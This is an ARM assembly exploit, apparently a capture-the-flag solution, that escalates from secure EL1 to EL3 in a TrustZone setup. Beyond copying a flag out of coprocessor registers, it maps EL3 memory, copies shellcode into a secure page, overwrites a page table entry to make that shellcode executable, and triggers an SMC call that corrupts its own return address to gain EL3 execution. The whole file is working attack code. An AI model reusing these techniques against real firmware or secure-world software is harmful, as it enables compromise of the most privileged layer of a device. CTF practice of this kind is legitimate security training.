.section .text
.arch_extension sec
.syntax unified
.global _start

.thumb
_start:

    # We're now running in S-EL1

    nop
    blx output_flag

.arm
output_flag:

    # Copy the flag onto the output buffer
    mov r0, pc
    sub r0, 0x310
    mrc p15,3,r1,c15,c12,0
    str r1, [r0]
    mrc p15,3,r1,c15,c12,1
    str r1, [r0,#4]
    mrc p15,3,r1,c15,c12,2
    str r1, [r0,#8]
    mrc p15,3,r1,c15,c12,3
    str r1, [r0,#0xC]
    mrc p15,3,r1,c15,c12,4
    str r1, [r0,#0x10]
    mrc p15,3,r1,c15,c12,5
    str r1, [r0,#0x14]
    mrc p15,3,r1,c15,c12,6
    str r1, [r0,#0x18]
    mrc p15,3,r1,c15,c12,7
    str r1, [r0,#0x1c]

    mov r6, r0

    # Map an EL3 data page into our memory region
    ldr r8, =0x080001E9
    ldr r0, =0x9000
    ldr r1, =0x0e002000
    mov r2, 8
    blx r8

    # Write the target stack address for our write
    ldr r8, =0x9418
    ldr r7, =0xe000f48
    str r7, [r8]

    # Copy out shellcode to a secure page
    ldr r0, =0x9800
    ldr r1, =0xa000
    mov r2, r6
    add r2, 0x800
loop:
    ldr r3, [r2]
    str r3, [r0]
    add r0, 4
    add r2, 4
    cmp r0, r1
    bne loop

    # Copy the S-EL1 flag to right before the shellcode
    ldr r0, =0x9700
    ldr r1, =0x9720
    mov r2, r6
loop2:
    ldr r3, [r2]
    str r3, [r0]
    add r0, 4
    add r2, 4
    cmp r0, r1
    bne loop2

    # Map part of the EL3 page table into our memory
    ldr r8, =0x080001E9
    ldr r0, =0x7000
    ldr r1, =0xe073000
    blx r8

    # Overwrite the PTE to make our shellcode executable
    ldr r8, =0x7010
    ldr r7, =0xe002783
    str r7, [r8]
    mov r7, 0x00
    str r7, [r8, #4]

    # Invoke a smc return value call, which will clobber its own return address
    # on the stack and give us execution of shellcode in El3
    ldr r0, =0x83000007
    ldr r1, =0xe002800
    smc #0
